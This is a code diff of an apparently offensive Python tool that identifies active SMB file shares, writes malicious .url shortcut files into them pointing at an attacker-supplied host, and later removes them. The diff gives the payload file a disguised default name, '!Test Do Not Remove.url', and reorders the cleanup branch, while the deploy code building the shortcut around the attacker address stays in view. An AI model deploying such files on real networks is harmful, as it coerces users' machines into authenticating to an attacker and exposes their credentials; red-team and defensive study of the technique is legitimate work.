@@ -80,7 +80,6 @@ parser.add_argument('--domain', required=True, help='Domain for authenticating t
 parser.add_argument('--targets', required=True,
                     help='Path to a text file containing UNC paths to file shares / base '
                          'directories for deployment or from which to remove payload files')
-parser.add_argument('--payload', required=True, help='Name of payload file ending in .url')
 
 # For deployment
 parser.add_argument('--max-depth', type=int, default=3,
@@ -94,6 +93,10 @@ parser.add_argument('--max-folders-per-share', type=int, default=10,
                     help='Maximum number of folders to output as targets per share')
 parser.add_argument('--attacker', required='--deploy' in sys.argv,
                     help='Attacker IP or hostname to place in malicious URL')
+
+# For deployment and cleanup
+parser.add_argument('--payload', default='!Test Do Not Remove.url', help='Name of payload file '
+                                                                         'ending in .url')
 
 # Modes
 parser.add_argument('--identify', action='store_true',
@@ -151,14 +154,6 @@ if args.identify:  # If the identification functionality is used to identify act
     with open('folder_targets.txt', mode='w') as f:
         for share_unc in filtered_rankings:
             f.write(share_unc + '\n')
-elif args.cleanup:  # Else if the cleanup functionality is used to delete deployed payloads
-    # Iterate over each folder where payloads were deployed
-    for payload_folder in targets:
-        try:  # Try to delete the payload file
-            remove(f'{payload_folder}\\{args.payload}')
-        except:  # Print a message if deletion fails
-            print(f'Failed to delete payload at: {payload_folder}\\{args.payload}')
-    quit()
 elif args.deploy:  # Else if the deploy functionality is used to deploy payloads
     payloads_written = []  # Track the UNC path of the folder to which each payload is written
     payload_contents = f'[InternetShortcut]\nURL={args.attacker}\nWorkingDirectory=\\\\' + \
@@ -180,3 +175,11 @@ elif args.deploy:  # Else if the deploy functionality is used to deploy payloads
     with open('payloads_written.txt', mode='a') as f:
         for payload_folder_unc in payloads_written:
             f.write(payload_folder_unc + '\n')
+elif args.cleanup:  # Else if the cleanup functionality is used to delete deployed payloads
+    # Iterate over each folder where payloads were deployed
+    for payload_folder in targets:
+        try:  # Try to delete the payload file
+            remove(f'{payload_folder}\\{args.payload}')
+        except:  # Print a message if deletion fails
+            print(f'Failed to delete payload at: {payload_folder}\\{args.payload}')
+    quit()
